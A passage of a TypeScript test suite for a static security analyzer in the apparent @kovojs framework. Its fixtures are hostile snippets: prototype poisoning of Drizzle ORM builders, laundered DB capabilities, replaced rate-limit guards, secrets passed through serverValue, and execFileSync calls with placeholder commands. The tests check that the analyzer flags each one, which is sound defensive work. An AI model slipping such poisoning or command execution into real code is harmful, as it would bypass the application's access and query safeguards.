      ['request carrier return', mutationSource({ helperBody: 'return request.db;' })],
      [
        'recursive helper',
        mutationSource({
          helperBody:
            "if (row.email === 'again') await writeContact(request, row);\n        await request.db.insert(contacts).values(row);",
        }),
      ],
      [
        'mixed root roles',
        mutationSource({
          invocation:
            'await writeContact(request, { email }); await writeContact({ db: request.db }, { email });',
        }),
      ],
    ];
    for (const [label, source] of hostile) {
      expect(sinks(source), label).not.toEqual([]);
    }

    const siblingExport = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'write.ts',
        source: `
          import { contacts } from './schema.js';
          export async function writeContact(request, row) {
            await request.db.insert(contacts).values(row);
          }
        `,
      },
      {
        fileName: 'mutations.ts',
        source: `
          import { mutation, publicAccess, s } from '@kovojs/server';
          import { writeContact } from './write.js';
          export const addContact = mutation({
            access: publicAccess('fixture'),
            csrf: false,
            csrfJustification: 'fixture',
            input: s.object({ email: s.string() }),
            async handler({ email }, request) {
              await writeContact(request, { email });
              return { ok: true };
            },
          });
        `,
      },
    ]);
    expect(siblingExport).not.toEqual([]);
  });

  it('keeps generic non-table capability methods outside the Drizzle helper restriction', () => {
    const facts = sinksFor(`
      import { mutation, publicAccess, s } from '@kovojs/server';
      function recordAudit(context) {
        context.insert('plain audit marker');
      }
      export const addContact = mutation({
        access: publicAccess('fixture'),
        csrf: false,
        csrfJustification: 'fixture',
        input: s.object({ email: s.string() }),
        handler(_input, _request, context) {
          recordAudit(context);
          return { ok: true };
        },
      });
    `);
    expect(facts).toEqual([]);
  });

  it('accepts only a pristine strict capability projection from a local query guard', () => {
    const schemaSource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const contacts = pgTable('contacts', { id: text('id').primaryKey() });
    `;
    const querySource = (helperBody: string) => `
      import { query } from '@kovojs/server';
      import { contacts } from './schema.js';
      export const contactsQuery = query({
        async load(_input, context) {
          const db = requireDb(context);
          return { items: await db.select({ id: contacts.id }).from(contacts) };
        },
      });
      function requireDb(context) {
        ${helperBody}
      }
    `;
    const sinks = (helperBody: string) =>
      sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        { fileName: 'queries.ts', source: querySource(helperBody) },
      ]);

    expect(
      sinks(`
        const db = context?.db;
        if (!db) throw new Error('missing db');
        return db;
      `),
    ).toEqual([]);

    const rawReadQuery = (statement: string, helperBody: string) => `
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { query } from '@kovojs/server';
      export const contactsQuery = query({
        async load(input, context) {
          const db = requireDb(context);
          const items = await db.rawRead(
            trustedSql(sql.raw(${statement}), { justification: 'reviewed contacts read' }),
            { reads: ['contacts'] },
          );
          return { items };
        },
      });
      function requireDb(context) {
        ${helperBody}
      }
    `;
    const strictHelper = `
      const db = context?.db;
      if (!db) throw new Error('missing db');
      return db;
    `;
    expect(
      sinksForFiles([
        {
          fileName: 'queries.ts',
          source: rawReadQuery("'select id from contacts'", strictHelper),
        },
      ]),
    ).toEqual([]);
    expect(
      sinksForFiles([
        {
          fileName: 'queries.ts',
          source: rawReadQuery('input.statement', strictHelper),
        },
      ]),
    ).not.toEqual([]);
    expect(
      sinksForFiles([
        {
          fileName: 'queries.ts',
          source: rawReadQuery("'select id from contacts'", 'return context;'),
        },
      ]),
    ).not.toEqual([]);

    for (const helperBody of [
      `
        if (!context?.db) throw new Error('missing db');
        if (!(context.db = context.fallbackDb)) throw new Error('missing fallback');
        return context.db;
      `,
      `
        if (!context?.db) throw new Error('missing db');
        if (!(context.db++)) throw new Error('invalid db');
        return context.db;
      `,
      `
        return context;
      `,
    ]) {
      expect(sinks(helperBody), helperBody).not.toEqual([]);
    }
  });

  it.each([
    ['unknown chain member', 'await request.db.evil().set({ email });'],
    ['identity helper laundering', 'await identity(request.db).update(contacts).set({ email });'],
    [
      'computed chain member',
      "const method = 'update'; await request.db[method](contacts).set({ email });",
    ],
    ['Function.call chain', 'await request.db.update.call(request.db, contacts).set({ email });'],
    [
      'Function.bind chain',
      'const update = request.db.update.bind(request.db); await update(contacts).set({ email });',
    ],
  ])('keeps arbitrary DB chain laundering visible through %s', (_label, operation) => {
    const facts = sinksForFiles([
      {
        fileName: 'schema.ts',
        source: `
          import { pgTable, text } from 'drizzle-orm/pg-core';
          export const contacts = pgTable('contacts', {
            id: text('id').primaryKey(),
            email: text('email').notNull(),
          });
        `,
      },
      {
        fileName: 'mutations.ts',
        source: `
          import { mutation, publicAccess, s } from '@kovojs/server';
          import { contacts } from './schema.js';
          function identity(value) { return value; }
          export const addContact = mutation({
            access: publicAccess('fixture'),
            csrf: false,
            csrfJustification: 'fixture',
            input: s.object({ email: s.string() }),
            async handler({ email }, request) {
              ${operation}
              return { ok: true };
            },
          });
        `,
      },
    ]);
    expect(facts, JSON.stringify(facts)).not.toEqual([]);
    expect(facts.map((fact) => fact.sink)).toContain('request-handler.opaque-call');
  });

  it('keeps the exact mutation DB and serverValue grammar closed under adversarial carriers', () => {
    const schemaSource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const contacts = pgTable('contacts', {
        id: text('id').primaryKey(),
        email: text('email').notNull(),
      });
    `;
    const mutationSource = ({
      prelude = '',
      read = `request.db.select().from(contacts).where(eq(contacts.email, email)).limit(1)`,
      server = `serverValue(id, 'server-generated fixture id')`,
      extraImport = '',
    }: {
      prelude?: string;
      read?: string;
      server?: string;
      extraImport?: string;
    } = {}) => `
      import { mutation, publicAccess, s, serverValue } from '@kovojs/server';
      import { eq } from 'drizzle-orm';
      import { contacts } from './schema.js';
      ${extraImport}
      export const addContact = mutation({
        access: publicAccess('fixture'),
        input: s.object({ email: s.string() }),
        async handler({ email }, request) {
          ${prelude}
          const rows = await ${read};
          for (const row of rows) {
            if (row) return { id: row.id };
          }
          const id = crypto.randomUUID();
          await request.db.insert(contacts).values({
            id: ${server},
            email,
          });
          return { id };
        },
      });
    `;

    const direct = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      { fileName: 'mutations.ts', source: mutationSource() },
    ]);
    expect(direct).toEqual([]);

    const poisonings: ReadonlyArray<readonly [string, string]> = [
      [
        'request const alias Object.defineProperty',
        `const alias = request; Object.defineProperty(alias, 'db', { value: {} });`,
      ],
      ['request const alias Reflect.set', `const alias = request; Reflect.set(alias, 'db', {});`],
      ['request const alias delete', `const alias = request; delete alias.db;`],
      ['request const alias assignment', `const alias = request; alias.db = alias.db;`],
      [
        'request object holder mutation',
        `const holder = { request }; Reflect.set(holder.request, 'db', {});`,
      ],
      [
        'request helper closure mutation',
        `function poison(target: object) { Reflect.set(target, 'db', {}); } poison(request);`,
      ],
      [
        'db destructuring alias mutation',
        `const { db: aliasDb } = request; Object.defineProperty(aliasDb, 'select', { value() { return []; } });`,
      ],
      [
        'db array alias mutation',
        `const [aliasDb] = [request.db]; Reflect.set(aliasDb, 'select', () => []);`,
      ],
      [
        'db prototype getter mutation',
        `Object.defineProperty(Object.getPrototypeOf(request.db), 'select', { get() { return () => []; } });`,
      ],
      ['db nested prototype assignment', `request.db.__proto__.select = () => [];`],
      [
        'db defineProperties mutation',
        `Object.defineProperties(request.db, { select: { value: () => [] } });`,
      ],
      [
        'db Reflect.defineProperty mutation',
        `Reflect.defineProperty(request.db, 'select', { value: () => [] });`,
      ],
    ];
    const misses: string[] = [];
    for (const [label, prelude] of poisonings) {
      const facts = sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        { fileName: 'mutations.ts', source: mutationSource({ prelude }) },
      ]);
      if (facts.length === 0) misses.push(label);
    }

    const alternateReads: ReadonlyArray<readonly [string, string]> = [
      [
        'computed root method',
        `request.db['select']().from(contacts).where(eq(contacts.email, email)).limit(1)`,
      ],
      [
        'computed suffix method',
        `request.db.select()['from'](contacts).where(eq(contacts.email, email)).limit(1)`,
      ],
      [
        'Function.call root method',
        `request.db.select.call(request.db).from(contacts).where(eq(contacts.email, email)).limit(1)`,
      ],
      [
        'Function.apply root method',
        `request.db.select.apply(request.db, []).from(contacts).where(eq(contacts.email, email)).limit(1)`,
      ],
      [
        'Reflect.apply root method',
        `Reflect.apply(request.db.select, request.db, []).from(contacts).where(eq(contacts.email, email)).limit(1)`,
      ],
      [
        'destructured DB alias',
        `(() => { const { db } = request; return db.select().from(contacts).where(eq(contacts.email, email)).limit(1); })()`,
      ],
      [
        'helper closure DB alias',
        `((db) => db.select().from(contacts).where(eq(contacts.email, email)).limit(1))(request.db)`,
      ],
    ];
    for (const [label, read] of alternateReads) {
      const facts = sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        { fileName: 'mutations.ts', source: mutationSource({ read }) },
      ]);
      if (facts.length === 0) misses.push(label);
    }

    const authorityValues: ReadonlyArray<readonly [string, string]> = [
      [
        'Cookie header in serverValue',
        `serverValue(request.headers.get('Cookie'), 'server-generated fixture id')`,
      ],
      ['whole request in serverValue', `serverValue(request, 'server-generated fixture id')`],
      [
        'request carrier in serverValue object',
        `serverValue({ request }, 'server-generated fixture id')`,
      ],
      [
        'request carrier in serverValue closure',
        `serverValue(() => request, 'server-generated fixture id')`,
      ],
      ['process object in serverValue', `serverValue(process, 'server-generated fixture id')`],
      [
        'process env object in serverValue',
        `serverValue(process.env, 'server-generated fixture id')`,
      ],
      [
        'process env in serverValue getter',
        `serverValue({ get value() { return process.env.CONTACT_ID; } }, 'server-generated fixture id')`,
      ],
      [
        'process env in serverValue proxy',
        `serverValue(new Proxy({}, { get() { return process.env.CONTACT_ID; } }), 'server-generated fixture id')`,
      ],
      [
        'process env in serverValue invoked closure',
        `serverValue((() => process.env.CONTACT_ID)(), 'server-generated fixture id')`,
      ],
    ];
    for (const [label, server] of authorityValues) {
      const facts = sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        { fileName: 'mutations.ts', source: mutationSource({ server }) },
      ]);
      if (facts.length === 0) misses.push(label);
    }

    const crossFilePoisoning = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'poison.ts',
        source: `
          export function poison(target: object) {
            Object.defineProperty(target, 'db', { value: {} });
          }
        `,
      },
      {
        fileName: 'mutations.ts',
        source: mutationSource({
          extraImport: `import { poison } from './poison.js';`,
          prelude: `poison(request);`,
        }),
      },
    ]);
    if (crossFilePoisoning.length === 0) misses.push('cross-file request mutation');

    const crossFileRead = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'read.ts',
        source: `
          export function read(db: unknown, table: unknown) {
            return (db as { select(): { from(table: unknown): unknown } }).select().from(table);
          }
        `,
      },
      {
        fileName: 'mutations.ts',
        source: mutationSource({
          extraImport: `import { read } from './read.js';`,
          read: `read(request.db, contacts)`,
        }),
      },
    ]);
    if (crossFileRead.length === 0) misses.push('cross-file DB helper');
    expect(misses).toEqual([]);
  });

  it('accepts only closed built-in Postgres column builders and exact references', () => {
    const safe = sinksFor(`
      import { pgTable, text } from 'drizzle-orm/pg-core';
      import { query } from '@kovojs/server';
      const users = pgTable('users', { id: text('id').primaryKey() });
      const posts = pgTable('posts', {
        id: text('id').primaryKey(),
        userId: text('user_id').notNull().references(() => users.id),
      });
      export const byId = query({ load(_input, context) {
        return context.db.select({ id: posts.id, userId: posts.userId }).from(posts);
      } });
    `);
    expect(safe).toEqual([]);

    const custom = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { customType, pgTable } from 'drizzle-orm/pg-core';
      import { query } from '@kovojs/server';
      const dangerousText = customType({
        dataType() { return 'text'; },
        fromDriver(value) { execFileSync(String(value)); return String(value); },
      });
      const users = pgTable('users', { id: dangerousText('id') });
      export const unsafe = query({ load(_input, context) {
        return context.db.select({ id: users.id }).from(users);
      } });
    `);
    expect(custom.length).toBeGreaterThan(0);

    const callbackSideEffect = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { pgTable, text } from 'drizzle-orm/pg-core';
      import { query } from '@kovojs/server';
      const users = pgTable('users', { id: text('id').primaryKey() });
      const posts = pgTable('posts', {
        userId: text('user_id').references(() => {
          execFileSync('reference-callback');
          return users.id;
        }),
      });
      export const unsafe = query({ load(_input, context) {
        return context.db.select({ userId: posts.userId }).from(posts);
      } });
    `);
    expect(callbackSideEffect.length).toBeGreaterThan(0);

    for (const [builderImport, prototypePoison] of [
      [
        '',
        `
        const prototype = Object.getPrototypeOf(text('probe'));
        prototype.primaryKey = hostile;
      `,
      ],
      [
        `import { PgTextBuilder } from 'drizzle-orm/pg-core';`,
        `PgTextBuilder.prototype.primaryKey = hostile;`,
      ],
      [
        `import { PgTextBuilder } from 'drizzle-orm/pg-core/columns/text';`,
        `PgTextBuilder.prototype.primaryKey = hostile;`,
      ],
      [
        `import { ColumnBuilder } from 'drizzle-orm/column-builder';`,
        `ColumnBuilder.prototype.primaryKey = hostile;`,
      ],
      [
        `import { PgText } from 'drizzle-orm/pg-core';`,
        `PgText.prototype.mapFromDriverValue = hostile;`,
      ],
      [`import { SQL } from 'drizzle-orm';`, `SQL.prototype.toQuery = hostile;`],
      [
        `import { Table } from 'drizzle-orm/table';`,
        `Object.defineProperty(Table.Symbol, 'Columns', { get: hostile });`,
      ],
    ] as const) {
      const poisoned = sinksFor(`
        import { execFileSync } from 'node:child_process';
        import { pgTable, text } from 'drizzle-orm/pg-core';
        import { query } from '@kovojs/server';
        ${builderImport}
        function hostile() {
          execFileSync('column-builder-prototype');
          return this;
        }
        ${prototypePoison}
        const users = pgTable('users', { id: text('id').primaryKey() });
        export const unsafe = query({ load(_input, context) {
          return context.db.select({ id: users.id }).from(users);
        } });
      `);
      expect(poisoned.length, prototypePoison).toBeGreaterThan(0);
    }

    const expressionPrototype = sinksFor(`
      import { eq } from 'drizzle-orm';
      import { execFileSync } from 'node:child_process';
      import { pgTable, text } from 'drizzle-orm/pg-core';
      import { query } from '@kovojs/server';
      const users = pgTable('users', { id: text('id').primaryKey() });
      const prototype = Object.getPrototypeOf(eq(users.id, 'probe'));
      prototype.toQuery = () => { execFileSync('sql-prototype'); return {}; };
      export const unsafe = query({ load(input, context) {
        return context.db.select({ id: users.id }).from(users).where(eq(users.id, input.id));
      } });
    `);
    expect(expressionPrototype.length).toBeGreaterThan(0);

    const indirectRuntimeImports = sinksForFiles([
      {
        fileName: 'barrel.ts',
        source: `export { SQL } from 'drizzle-orm';`,
      },
      {
        fileName: 'app.ts',
        source: `
          import { execFileSync } from 'node:child_process';
          import { pgTable, text } from 'drizzle-orm/pg-core';
          import { query } from '@kovojs/server';
          import { SQL } from './barrel.js';
          SQL.prototype.toQuery = () => { execFileSync('barrel-sql'); return {}; };
          const users = pgTable('users', { id: text('id').primaryKey() });
          export const unsafe = query({ load(_input, context) {
            return context.db.select({ id: users.id }).from(users);
          } });
        `,
      },
    ]);
    expect(indirectRuntimeImports.length).toBeGreaterThan(0);

    const dynamicRuntimeImport = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { pgTable, text } from 'drizzle-orm/pg-core';
      import { query } from '@kovojs/server';
      const { SQL } = await import('drizzle-orm');
      SQL.prototype.toQuery = () => { execFileSync('dynamic-sql'); return {}; };
      const users = pgTable('users', { id: text('id').primaryKey() });
      export const unsafe = query({ load(_input, context) {
        return context.db.select({ id: users.id }).from(users);
      } });
    `);
    expect(dynamicRuntimeImport.length).toBeGreaterThan(0);
  });

  it('accepts exact pristine domain config and rejects opaque or mutated aliases', () => {
    const safe = sinksForFiles([
      {
        fileName: 'model.ts',
        source: `
          import { domain } from '@kovojs/server';
          export const usersDomain = domain('users');
        `,
      },
      {
        fileName: 'schema.ts',
        source: `
          import { kovo } from '@kovojs/drizzle';
          import { pgTable, text } from 'drizzle-orm/pg-core';
          import { usersDomain } from './model.js';
          export const users = pgTable(
            'users',
            { id: text('id').primaryKey() },
            kovo({ domain: usersDomain, key: (table) => table.id }),
          );
        `,
      },
      {
        fileName: 'app.ts',
        source: `
          import { mutation, query } from '@kovojs/server';
          import { usersDomain } from './model.js';
          import { users } from './schema.js';
          export const byId = query({ load(_input, context) {
            return context.db.select({ id: users.id }).from(users);
          } });
          export const touch = mutation({
            registry: { tables: ['users'], touches: [usersDomain] },
            handler(_input, _request, context) {
              context.invalidate(usersDomain);
              return { ok: true };
            },
          });
        `,
      },
    ]);
    expect(safe).toEqual([]);

    for (const invalidation of [
      'const alias = context; alias.invalidate(usersDomain);',
      "context['invalidate'](usersDomain);",
      'const alias = usersDomain; context.invalidate(alias);',
    ]) {
      const unsafe = sinksFor(`
        import { domain, mutation } from '@kovojs/server';
        const usersDomain = domain('users');
        export const touch = mutation({
          registry: { touches: [usersDomain] },
          handler(_input, _request, context) {
            ${invalidation}
            return { ok: true };
          },
        });
      `);
      expect(unsafe.length, invalidation).toBeGreaterThan(0);
    }

    for (const declaration of [
      `
        const usersDomain = new Proxy({ key: 'users' }, {
          ownKeys(target) { execFileSync('domain-proxy'); return Reflect.ownKeys(target); },
        });
      `,
      `
        const exact = domain('users');
        const usersDomain = true ? exact : null;
        usersDomain.key = 'forged';
      `,
      `
        const exact = domain('users');
        const usersDomain = true && exact;
        usersDomain.key = 'forged';
      `,
      `
        const exact = domain('users');
        const usersDomain = (true, exact);
        usersDomain.key = 'forged';
      `,
    ]) {
      const unsafe = sinksFor(`
        import { execFileSync } from 'node:child_process';
        import { kovo } from '@kovojs/drizzle';
        import { domain, query } from '@kovojs/server';
        import { pgTable, text } from 'drizzle-orm/pg-core';
        ${declaration}
        const users = pgTable(
          'users',
          { id: text('id').primaryKey() },
          kovo({ domain: usersDomain }),
        );
        export const route = query({ load(_input, context) {
          return context.db.select({ id: users.id }).from(users);
        } });
      `);
      expect(unsafe.length, declaration).toBeGreaterThan(0);
    }
  });

  it('rejects direct, container-laundered, and captured DB capability mutation', () => {
    for (const body of [
      `
        const hostile = () => ({ forged: true });
        context.db.select = hostile;
        return context.db.select();
      `,
      `
        const hostile = () => ({ forged: true });
        const holder = { db: context.db };
        holder.db.select = hostile;
        return context.db.select();
      `,
      `
        const hostile = () => ({ forged: true });
        function mutate() { context.db.select = hostile; }
        mutate();
        return context.db.select();
      `,
      `
        const hostile = () => ({ forged: true });
        function poison(db) { db.select = hostile; }
        poison(context.db);
        return context.db.select();
      `,
      `
        const hostile = () => ({ forged: true });
        function poison(ctx) { ctx.db = { select: hostile }; }
        poison(context);
        return context.db.select();
      `,
      `
        const hostile = () => ({ forged: true });
        let leaked = context.db;
        leaked.select = hostile;
        return context.db.select();
      `,
      `
        Object.defineProperty(context.db, 'select', { value: () => ({ forged: true }) });
        return context.db.select();
      `,
      `
        Object.defineProperty(context, 'db', {
          value: { select: () => ({ forged: true }) },
        });
        return context.db.select();
      `,
      `
        Object.setPrototypeOf(context.db, { select: () => ({ forged: true }) });
        return context.db.select();
      `,
      `
        respond.file(context.db, { contentType: 'application/octet-stream' });
        return context.db.select();
      `,
      `
        respond.stream(context.db, { contentType: 'application/octet-stream' });
        return context.db.select();
      `,
      `
        let saved;
        saved = input.flag ? context.db : null;
        return context.db.select();
      `,
      `
        let saved;
        saved = input.flag && context.db;
        return context.db.select();
      `,
      `
        let saved;
        saved = input.value ?? context.db;
        return context.db.select();
      `,
      `
        let saved;
        saved = (input.flag, context.db);
        return context.db.select();
      `,
      `
        let saved;
        saved = { db: input.flag ? context.db : null };
        return context.db.select();
      `,
      `
        let saved;
        saved = [input.flag ? context.db : null];
        return context.db.select();
      `,
      `
        let saved;
        saved = () => context.db;
        return context.db.select();
      `,
      `
        let saved;
        saved = async () => context.db;
        return context.db.select();
      `,
      `
        let saved;
        saved = () => input.flag ? context.db : null;
        return context.db.select();
      `,
      `
        let saved;
        saved = (db = context.db) => db;
        return context.db.select();
      `,
      `
        let saved;
        saved = function* () { yield context.db; };
        return context.db.select();
      `,
      `
        let saved;
        saved = { leak: () => context.db };
        return context.db.select();
      `,
      `
        const leaked = context['d' + 'b'];
        leaked.select = () => ({ forged: true });
        return context.db.select();
      `,
      `
        const key = input.key;
        const leaked = context[key];
        leaked.select = () => ({ forged: true });
        return context.db.select();
      `,
      `
        const leaked = context[\`d\${'b'}\`];
        leaked.select = () => ({ forged: true });
        return context.db.select();
      `,
    ]) {
      const facts = sinksFor(`
        import { query, respond } from '@kovojs/server';
        export const unsafe = query({ load(input, context) {
          ${body}
        } });
      `);
      expect(facts, body).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-call',
            source: 'context.db.select',
          }),
        ]),
      );
    }

    const crossModule = sinksForFiles([
      {
        fileName: 'helper.ts',
        source: `export function poison(context) {
          context.db = { select() { return { forged: true }; } };
        }`,
      },
      {
        fileName: 'app.ts',
        source: `
          import { query } from '@kovojs/server';
          import { poison } from './helper.js';
          export const unsafe = query({ load(_input, context) {
            poison(context);
            return context.db.select();
          } });
        `,
      },
    ]);
    expect(crossModule.length).toBeGreaterThan(0);

    const safePredicates = sinksFor(`
      import { query } from '@kovojs/server';
      export const safe = query({ load(input, context) {
        const hasDb = context.db !== undefined;
        const selected = context.db ? 'present' : 'missing';
        const marker = input.flag && hasDb;
        if (marker && selected === 'missing') throw new Error('unreachable fixture');
        return context.db.select();
      } });
    `);
    expect(safePredicates).toEqual([]);
  });

  it('accepts only exact callback-free guards.rateLimit provenance', () => {
    const safe = sinksFor(`
      import * as server from '@kovojs/server';
      import { guards as serverGuards, query } from '@kovojs/server';
      const allow = serverGuards.rateLimit({ max: 10, per: 'global' });
      const authed = server.guards.authed();
      export const guarded = query({ guard: allow, load() { return { ok: true }; } });
      export const authenticated = query({ guard: authed, load() { return { ok: true }; } });
    `);
    expect(safe).toEqual([]);

    const lookalike = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const guards = { rateLimit() {
        return () => { execFileSync('local-lookalike'); return true; };
      } };
      const allow = guards.rateLimit({ max: 10, per: 'global' });
      export const guarded = query({ guard: allow, load() { return { ok: true }; } });
    `);
    expect(lookalike).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'local-lookalike'",
        }),
      ]),
    );

    const callbackBearing = sinksFor(`
      import { guards, query } from '@kovojs/server';
      const allow = guards.rateLimit({ key: request => request.url, max: 10 });
      export const guarded = query({ guard: allow, load() { return { ok: true }; } });
    `);
    expect(callbackBearing).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<dynamic-callback>',
        }),
      ]),
    );

    const sideEffectingOption = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { guards, query } from '@kovojs/server';
      function dangerousMax() { execFileSync('rate-limit-option'); return 10; }
      const allow = guards.rateLimit({ max: dangerousMax(), per: 'global' });
      export const guarded = query({ guard: allow, load() { return { ok: true }; } });
    `);
    expect(sideEffectingOption.length).toBeGreaterThan(0);

    for (const source of [
      `
        import { execFileSync } from 'node:child_process';
        import { guards, query } from '@kovojs/server';
        const hostile = () => { execFileSync('replace-rate-limit'); return true; };
        guards.rateLimit = hostile;
        export const guarded = query({
          guard: guards.rateLimit({ max: 10, per: 'global' }),
          load() { return { ok: true }; },
        });
      `,
      `
        import { execFileSync } from 'node:child_process';
        import { guards, query } from '@kovojs/server';
        const hostile = () => { execFileSync('add-pwn'); return true; };
        guards.pwn = hostile;
        export const guarded = query({ guard: guards.pwn(), load() { return { ok: true }; } });
      `,
      `
        import { execFileSync } from 'node:child_process';
        import { guards, query } from '@kovojs/server';
        const alias = guards;
        alias.rateLimit = () => { execFileSync('alias-replace'); return true; };
        export const guarded = query({
          guard: guards.rateLimit({ max: 10, per: 'global' }),
          load() { return { ok: true }; },
        });
      `,
      `
        import { execFileSync } from 'node:child_process';
        import { guards, query } from '@kovojs/server';
        Object.defineProperty(guards, 'rateLimit', {
          value: () => { execFileSync('descriptor-replace'); return true; },
        });
        export const guarded = query({
          guard: guards.rateLimit({ max: 10, per: 'global' }),
          load() { return { ok: true }; },
        });
      `,
    ]) {
      expect(sinksFor(source)).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-source',
            source: '<dynamic-callback>',
          }),
        ]),
      );
    }

    const dynamicCarrier = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { guards, query } from '@kovojs/server';
      const server = await import('@kovojs/server');
      server.guards.rateLimit = () => {
        execFileSync('dynamic-guard-carrier');
        return true;
      };
      export const guarded = query({
        guard: guards.rateLimit({ max: 10, per: 'global' }),
        load() { return { ok: true }; },
      });
    `);
    expect(dynamicCarrier.length).toBeGreaterThan(0);

    for (const source of [
      `
        import { guards, query } from '@kovojs/server';
        const opts = { max: 10, per: 'global' };
        opts.key = request => request.url;
        export const guarded = query({ guard: guards.rateLimit(opts), load() { return true; } });
      `,
      `
        import { guards, query } from '@kovojs/server';
        const base = { max: 10, per: 'global' };
        const opts = base;
        export const guarded = query({ guard: guards.rateLimit(opts), load() { return true; } });
      `,
      `
        import { guards, query } from '@kovojs/server';
        const opts = { max: 10, per: 'global' };
        Object.defineProperty(opts, 'key', { value: request => request.url });
        export const guarded = query({ guard: guards.rateLimit(opts), load() { return true; } });
      `,
    ]) {
      expect(sinksFor(source)).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-source',
            source: '<dynamic-callback>',
          }),
        ]),
      );
    }
  });

  it('rejects side effects in exact static access values and conditional tests', () => {
    const argument = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { publicAccess, query } from '@kovojs/server';
      function dangerousReason() { execFileSync('access-reason'); return 'public'; }
      export const unsafe = query({
        access: publicAccess(dangerousReason()),
        load() { return { ok: true }; },
      });
    `);
    expect(argument.length).toBeGreaterThan(0);

    const condition = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { publicAccess, query } from '@kovojs/server';
      function dangerousCondition() { execFileSync('access-condition'); return true; }
      export const unsafe = query({
        access: dangerousCondition()
          ? publicAccess('left')
          : publicAccess('right'),
        load() { return { ok: true }; },
      });
    `);
    expect(condition.length).toBeGreaterThan(0);
  });

  it('accepts only exact guards.all compositions over universally closed local callbacks', () => {
    // SPEC §6.6 / §10.3: the combiner does not launder authored guard bodies. The callback
    // remains an ordinary request root, while its complete value-use graph must stay local and
    // direct so aliases, computed dispatch, and Function protocol calls remain fail-closed.
    const safe = sinksFor(`
      import { guards, query } from '@kovojs/server';
      const customGuard = () => true;
      export const guarded = query({
        guard: guards.all(customGuard, guards.rateLimit({ max: 10, per: 'global' })),
        load() { return { ok: true }; },
      });
    `);
    expect(safe).toEqual([]);

    const composite = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { guards, query } from '@kovojs/server';
      const customGuard = () => { execFileSync('composite-guard'); return true; };
      export const guarded = query({
        guard: guards.all(customGuard, guards.rateLimit({ max: 10, per: 'global' })),
        load() { return { ok: true }; },
      });
    `);
    expect(composite).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'composite-guard'",
        }),
      ]),
    );

    const imported = sinksForFiles([
      { fileName: 'guard.ts', source: `export const customGuard = () => true;` },
      {
        fileName: 'app.ts',
        source: `
          import { guards, query } from '@kovojs/server';
          import { customGuard } from './guard.js';
          export const guarded = query({
            guard: guards.all(customGuard, guards.rateLimit({ max: 10, per: 'global' })),
            load() { return true; },
          });
        `,
      },
    ]);
    expect(imported).not.toEqual([]);

    for (const source of [
      `
        import { guards, query } from '@kovojs/server';
        let customGuard = () => true;
        export const guarded = query({ guard: guards.all(customGuard), load() { return true; } });
      `,
      `
        import { guards, query } from '@kovojs/server';
        const customGuard = () => true;
        const alias = customGuard;
        export const guarded = query({ guard: guards.all(customGuard), load() { return alias(); } });
      `,
      `
        import { guards, query } from '@kovojs/server';
        export const customGuard = () => true;
        export const guarded = query({ guard: guards.all(customGuard), load() { return true; } });
      `,
      `
        import { guards, query } from '@kovojs/server';
        const customGuard = () => true;
        export const guarded = query({ guard: guards['all'](customGuard), load() { return true; } });
      `,
      `
        import { guards, query } from '@kovojs/server';
        const customGuard = () => true;
        export const guarded = query({ guard: guards.all.call(guards, customGuard), load() { return true; } });
      `,
      `
        import { guards, query } from '@kovojs/server';
        const customGuard = () => true;
        const dynamicGuard = () => true;
        export const guarded = query({
          guard: guards.all(customGuard, dynamicGuard()),
          load() { return true; },
        });
      `,
      `
        import { guards, query } from '@kovojs/server';
        const customGuard = () => true;
        Object.defineProperty(customGuard, 'apply', { value: () => true });
        export const guarded = query({ guard: guards.all(customGuard), load() { return true; } });
      `,
    ]) {
      expect(sinksFor(source)).not.toEqual([]);
    }

    const proxied = sinksFor(`
      import { guards, query } from '@kovojs/server';
      const guardedByProxy = new Proxy(
        guards.rateLimit({ max: 10, per: 'global' }),
        { apply() { return true; } },
      );
      export const guarded = query({
        guard: guardedByProxy,
        load() { return { ok: true }; },
      });
    `);
    expect(proxied).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<dynamic-callback>',
        }),
      ]),
    );
  });

  it('binds exact guard and respond trust to the use-site import symbol', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { guards, query, respond } from '@kovojs/server';
      void guards;
      void respond;

      function withGuard(guards) {
        const allow = guards.rateLimit({ max: 10, per: 'global' });
        return query({ guard: allow, load() { return { ok: true }; } });
      }
      withGuard({ rateLimit() {
        return () => { execFileSync('parameter-guard'); return true; };
      } });

      function withRespond(respond) {
        return query({ load() { return respond.file('parameter-respond'); } });
      }
      withRespond({ file() { execFileSync('parameter-respond'); return 'unsafe'; } });

      function withLocalGuard() {
        const guards = { rateLimit() {
          return () => { execFileSync('const-guard'); return true; };
        } };
        return query({
          guard: guards.rateLimit({ max: 10, per: 'global' }),
          load() { return { ok: true }; },
        });
      }
      withLocalGuard();

      function withLocalRespond() {
        function respond() { return undefined; }
